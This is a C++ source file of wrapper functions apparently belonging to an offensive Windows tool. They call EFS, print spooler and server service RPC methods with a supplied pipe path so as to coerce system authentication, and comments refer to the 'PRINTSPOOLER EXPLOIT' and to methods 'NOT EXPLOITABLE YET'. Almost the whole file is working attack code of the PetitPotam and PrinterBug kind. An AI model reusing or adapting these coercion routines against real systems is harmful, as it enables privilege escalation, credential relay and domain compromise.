#include <iostream>
#include <Windows.h>
#include <functional>
#include <rpc.h> 
#include <strsafe.h>

#include "ms-efsr_h.h"
#include "ms-rprn_h.h"
#include "ms-par_h.h"
#include "ms-srvsvc_h.h"
#include "CoerceFunctions.h"


long callEfsRpcOpenFileRaw(RPC_BINDING_HANDLE Binding, LPWSTR targetedPipeName) {
    wprintf(L"[*] Invoking EfsRpcOpenFileRaw with target path: %ws\r\n", targetedPipeName);
    long result;
    long flag = 0;
    PVOID pContext;

    result = EfsRpcOpenFileRaw(Binding, &pContext, targetedPipeName, flag);
    return result;
}

long callEfsRpcEncryptFileSrv(RPC_BINDING_HANDLE Binding, LPWSTR targetedPipeName) {
    wprintf(L"[*] Invoking EfsRpcEncryptFileSrv with target path: %ws\r\n", targetedPipeName);
    long result;

    result = EfsRpcEncryptFileSrv(Binding, targetedPipeName);
    return result;
}

long callEfsRpcDecryptFileSrv(RPC_BINDING_HANDLE Binding, LPWSTR targetedPipeName) {
    wprintf(L"[*] Invoking EfsRpcDecryptFileSrv with target path: %ws\r\n", targetedPipeName);
    long result;
    long OpenFlag = 0;

    result = EfsRpcDecryptFileSrv(Binding, targetedPipeName, OpenFlag);
    return result;
}

long callEfsRpcQueryUsersOnFile(RPC_BINDING_HANDLE Binding, LPWSTR targetedPipeName) {
    wprintf(L"[*] Invoking EfsRpcQueryUsersOnFile with target path: %ws\r\n", targetedPipeName);
    long result;
    ENCRYPTION_CERTIFICATE_HASH_LIST* Users = nullptr;

    result = EfsRpcQueryUsersOnFile(Binding, targetedPipeName, &Users);
    return result;
}

long callEfsRpcQueryRecoveryAgents(RPC_BINDING_HANDLE Binding, LPWSTR targetedPipeName) {
    wprintf(L"[*] Invoking EfsRpcQueryRecoveryAgents with target path: %ws\r\n", targetedPipeName);
    long result;
    ENCRYPTION_CERTIFICATE_HASH_LIST* Users = nullptr;

    result = EfsRpcQueryRecoveryAgents(Binding, targetedPipeName, &Users);
    return result;
}

long callEfsRpcRemoveUsersFromFile(RPC_BINDING_HANDLE Binding, LPWSTR targetedPipeName) {
    wprintf(L"[*] Invoking EfsRpcRemoveUsersFromFile with target path: %ws\r\n", targetedPipeName);
    long result;
    ENCRYPTION_CERTIFICATE_HASH_LIST users;
    users.nCert_Hash = 1;
    ENCRYPTION_CERTIFICATE_HASH user;
    user.cbTotalLength = sizeof(ENCRYPTION_CERTIFICATE_HASH);
    user.pUserSid = nullptr;
    user.pHash = nullptr;
    user.lpDisplayInformation = nullptr;
    users.pUsers = new PENCRYPTION_CERTIFICATE_HASH[users.nCert_Hash];
    users.pUsers[0] = &user;

    result = EfsRpcRemoveUsersFromFile(Binding, targetedPipeName, &users);
    return result;
}

long callEfsRpcAddUsersToFile(RPC_BINDING_HANDLE Binding, LPWSTR targetedPipeName) {
    wprintf(L"[*] Invoking EfsRpcAddUsersToFile with target path: %ws\r\n", targetedPipeName);
    long result;
    ENCRYPTION_CERTIFICATE_LIST certificates;
    certificates.nUsers = 1;
    ENCRYPTION_CERTIFICATE user;
    user.cbTotalLength = sizeof(ENCRYPTION_CERTIFICATE);
    user.pUserSid = nullptr;
    user.pCertBlob = nullptr;
    certificates.pUsers = new PENCRYPTION_CERTIFICATE[certificates.nUsers];
    certificates.pUsers[0] = &user;

    result = EfsRpcAddUsersToFile(Binding, targetedPipeName, &certificates);
    return result;
}

// NOT EXPLOITABLE YET
long callEfsRpcFileKeyInfo(RPC_BINDING_HANDLE Binding, LPWSTR targetedPipeName) {
    wprintf(L"[*] Invoking EfsRpcFileKeyInfo with target path: %ws\r\n", targetedPipeName);
    long result;
    DWORD infoClass = 1;
    EFS_RPC_BLOB* keyInfo = nullptr;

    result = EfsRpcFileKeyInfo(Binding, targetedPipeName, infoClass, &keyInfo);
    return result;
}

long callEfsRpcDuplicateEncryptionInfoFile(RPC_BINDING_HANDLE Binding, LPWSTR targetedPipeName) {
    wprintf(L"[*] Invoking EfsRpcDuplicateEncryptionInfoFile with target path: %ws\r\n", targetedPipeName);
    long result;
    DWORD dwCreationDisposition = 1;
    DWORD dwAttributes = 2;

    result = EfsRpcDuplicateEncryptionInfoFile(Binding, targetedPipeName, targetedPipeName, dwCreationDisposition, dwAttributes, nullptr, FALSE);
    return result;
}

long callEfsRpcAddUsersToFileEx(RPC_BINDING_HANDLE Binding, LPWSTR targetedPipeName) {
    wprintf(L"[*] Invoking EfsRpcAddUsersToFileEx with target path: %ws\r\n", targetedPipeName);
    long result;
    DWORD dwFileKeyInfoFlags = 0;
    ENCRYPTION_CERTIFICATE_LIST certificates;
    certificates.nUsers = 1;
    ENCRYPTION_CERTIFICATE user;
    user.cbTotalLength = sizeof(ENCRYPTION_CERTIFICATE);
    user.pUserSid = nullptr;
    user.pCertBlob = nullptr;
    certificates.pUsers = new PENCRYPTION_CERTIFICATE[certificates.nUsers];
    certificates.pUsers[0] = &user;

    result = EfsRpcAddUsersToFileEx(Binding, dwFileKeyInfoFlags, nullptr, targetedPipeName, &certificates);
    return result;
}

// NOT EXPLOITABLE YET
long callEfsRpcFileKeyInfoEx(RPC_BINDING_HANDLE Binding, LPWSTR targetedPipeName) {
    wprintf(L"[*] Invoking EfsRpcFileKeyInfoEx with target path: %ws\r\n", targetedPipeName);
    long result;
    DWORD dwFileKeyInfoFlags = 0;
    DWORD InfoClass = 1;
    EFS_RPC_BLOB* KeyInfo = nullptr;

    result = EfsRpcFileKeyInfoEx(Binding, dwFileKeyInfoFlags, nullptr, targetedPipeName, InfoClass, &KeyInfo);
    return result;
}

long callEfsRpcGetEncryptedFileMetadata(RPC_BINDING_HANDLE Binding, LPWSTR targetedPipeName) {
    wprintf(L"[*] Invoking EfsRpcGetEncryptedFileMetadata with target path: %ws\r\n", targetedPipeName);
    long result;
    EFS_RPC_BLOB* EfsStreamBlob = nullptr;

    result = EfsRpcGetEncryptedFileMetadata(Binding, targetedPipeName, &EfsStreamBlob);
    return result;
}

long callEfsRpcEncryptFileExSrv(RPC_BINDING_HANDLE Binding, LPWSTR targetedPipeName) {
    wprintf(L"[*] Invoking EfsRpcEncryptFileExSrv with target path: %ws\r\n", targetedPipeName);
    long result;
    wchar_t* ProtectorDescriptor = nullptr;
    unsigned long Flags = 0;

    result = EfsRpcEncryptFileExSrv(Binding, targetedPipeName, ProtectorDescriptor, Flags);
    return result;
}

long callEfsRpcQueryProtectors(RPC_BINDING_HANDLE Binding, LPWSTR targetedPipeName) {
    wprintf(L"[*] Invoking EfsRpcQueryProtectors with target path: %ws\r\n", targetedPipeName);
    long result;
    PENCRYPTION_PROTECTOR_LIST* ppProtectorList = new PENCRYPTION_PROTECTOR_LIST;
    ppProtectorList[0] = new ENCRYPTION_PROTECTOR_LIST;
    ppProtectorList[0]->nProtectors = 1;
    PENCRYPTION_PROTECTOR protector = new ENCRYPTION_PROTECTOR;
    protector->cbTotalLength = sizeof(ENCRYPTION_PROTECTOR);
    protector->pUserSid = nullptr;
    protector->lpProtectorDescriptor = nullptr;
    ppProtectorList[0]->pProtectors = new PENCRYPTION_PROTECTOR[1];
    ppProtectorList[0]->pProtectors[0] = protector;

    result = EfsRpcQueryProtectors(Binding, targetedPipeName, &ppProtectorList);
    return result;
}


long callRpcRemoteFindFirstPrinterChangeNotification(wchar_t* targetedPipeName) {
    wprintf(L"[*] Invoking RpcRemoteFindFirstPrinterChangeNotification with target path: %ws\r\n", targetedPipeName);
    // RETRIEVING HOSTNAME. NECESSARY FOR PRINTSPOOLER EXPLOIT
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName);
    GetComputerNameA(computerName, &size);
    wchar_t* localhostComputerName;
    localhostComputerName = (wchar_t*)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
    StringCchPrintf(localhostComputerName, MAX_PATH, L"\\\\%hs", computerName);

    // INITIALIZING ALL PARAMETERS
    PRINTER_HANDLE hPrinter = NULL;
    HRESULT hr = NULL;
    DEVMODE_CONTAINER devmodeContainer;
    SecureZeroMemory((char*)&(devmodeContainer), sizeof(DEVMODE_CONTAINER));

    RpcTryExcept
    {
        hr = RpcOpenPrinter(localhostComputerName, &hPrinter, NULL, &devmodeContainer, 0);

        if (hr == ERROR_SUCCESS) {
            hr = RpcRemoteFindFirstPrinterChangeNotification(hPrinter, 0x00000100 /* PRINTER_CHANGE_ADD_JOB */,0, targetedPipeName, 0, NULL,NULL);
            RpcClosePrinter(&hPrinter);
        }
        else
        {
            wprintf(L"RpcOpenPrinter failed %d\n", hr);
        }
    }
    RpcExcept(EXCEPTION_EXECUTE_HANDLER);
    {
        hr = RpcExceptionCode();

    }
    RpcEndExcept;
    return hr;
}

long callRpcAsyncOpenPrinter(RPC_BINDING_HANDLE Binding, wchar_t* targetedPipeName) {
    wprintf(L"[*] Invoking RpcAsyncOpenPrinter with target path: %ws\r\n", targetedPipeName);
    // RETRIEVING HOSTNAME. NECESSARY FOR PRINTSPOOLER EXPLOIT
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName);
    GetComputerNameA(computerName, &size);
    wchar_t* localhostComputerName;
    localhostComputerName = (wchar_t*)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
    StringCchPrintf(localhostComputerName, MAX_PATH, L"\\\\%hs", computerName);

    // INITIALIZING ALL PARAMETERS
    PRINTER_HANDLE hPrinter = NULL;
    HRESULT hr = NULL;
    DEVMODE_CONTAINER devmodeContainer;
    wchar_t* pdatatype = NULL;
    SecureZeroMemory((char*)&(devmodeContainer), sizeof(DEVMODE_CONTAINER));

    RpcTryExcept
    {
        // GETTING PRINTER HANDLE

        hr = RpcAsyncOpenPrinter(Binding, targetedPipeName, &hPrinter, pdatatype, &devmodeContainer, 0, NULL);
    }
    RpcExcept(EXCEPTION_EXECUTE_HANDLER);
    {
        hr = RpcExceptionCode();
    }
    RpcEndExcept;
    return hr;

}

long callRpcRemoteFindFirstPrinterChangeNotificationEx(wchar_t* targetedPipeName) {
    wprintf(L"[*] Invoking RpcRemoteFindFirstPrinterChangeNotificationEx with target path: %ws\r\n", targetedPipeName);
    // RETRIEVING HOSTNAME. NECESSARY FOR PRINTSPOOLER EXPLOIT
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName);
    GetComputerNameA(computerName, &size);
    wchar_t* localhostComputerName;
    localhostComputerName = (wchar_t*)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
    StringCchPrintf(localhostComputerName, MAX_PATH, L"\\\\%hs", computerName);

    // INITIALIZING ALL PARAMETERS
    PRINTER_HANDLE hPrinter = NULL;
    HRESULT hr = NULL;
    DEVMODE_CONTAINER devmodeContainer;
    SecureZeroMemory((char*)&(devmodeContainer), sizeof(DEVMODE_CONTAINER));

    RpcTryExcept
    {
        // GETTING PRINTER HANDLE
        hr = RpcOpenPrinter(localhostComputerName, &hPrinter, NULL, &devmodeContainer, 0);

        if (hr == ERROR_SUCCESS) {
            hr = RpcRemoteFindFirstPrinterChangeNotificationEx(hPrinter, 0x00000100 /* PRINTER_CHANGE_ADD_JOB */,0, targetedPipeName, 0, NULL);
            RpcClosePrinter(&hPrinter);
        }
        else
        {
            wprintf(L"[MS-RPRN] [-] RpcOpenPrinter failed %d\n", hr);
        }
    }
    RpcExcept(EXCEPTION_EXECUTE_HANDLER);
    {
        hr = RpcExceptionCode();
        return hr;
    }
    RpcEndExcept;
    return 0;
}


long callNetrShareGetInfo(wchar_t* targetedPipeName) {
    long result = 0;
    DWORD level = 2;

    wchar_t* serverName;
    serverName = (wchar_t*)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
    StringCchPrintf(serverName, MAX_PATH, L"localhost");

    SHARE_INFO_2 InfoStruct;
    memset(&InfoStruct, 0, sizeof(SHARE_INFO_2));

    result = NetrShareGetInfo(serverName, targetedPipeName, level, (LPSHARE_INFO)&InfoStruct);

    if (result != 0) {
        std::cerr << "Erreur lors de l'appel � NetrShareGetInfo. Code d'erreur : " << result << std::endl;
        // G�rer l'erreur selon vos besoins.
    }
    else {
        wprintf(L"Nom : %ls\n", InfoStruct.shi2_netname);
        wprintf(L"OK\n");
    }

    return result;
}
long callNetrShareCheck(wchar_t* targetedPipeName) {
    long result = 0;

    wchar_t* serverName;
    serverName = (wchar_t*)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
    StringCchPrintf(serverName, MAX_PATH, L"localhost");

    DWORD Type;

    result = NetrShareCheck(serverName, targetedPipeName, &Type);
    wprintf(L"NetrShareCheck returned %lx\n", result);
    return result;
}

long callNetprPathType(wchar_t* targetedPipeName) {
    long result = 0;

    wchar_t* serverName;
    serverName = (wchar_t*)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
    StringCchPrintf(serverName, MAX_PATH, L"localhost");

    DWORD pathType;
    DWORD flags = 0;

    NetprPathType(serverName, targetedPipeName, &pathType, flags);
    wprintf(L"NetprPathType returned %lx\n", result);
    return result;
}


long callNetrpGetFileSecurity(wchar_t* targetedPipeName) {
    long result = 0;

    wchar_t* serverName;
    serverName = (wchar_t*)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
    StringCchPrintf(serverName, MAX_PATH, L"localhost");

    wchar_t* lpFileName;
    lpFileName = (wchar_t*)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
    StringCchPrintf(lpFileName, MAX_PATH, L"poool2");

    SECURITY_INFORMATION RequestedInformation = OWNER_SECURITY_INFORMATION | GROUP_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION;
    PADT_SECURITY_DESCRIPTOR SecurityDescriptor = NULL;


    result = NetrpGetFileSecurity(serverName, targetedPipeName, lpFileName, RequestedInformation, &SecurityDescriptor);
    wprintf(L"NetrpGetFileSecurity returned %lx\n", result);
    return result;
}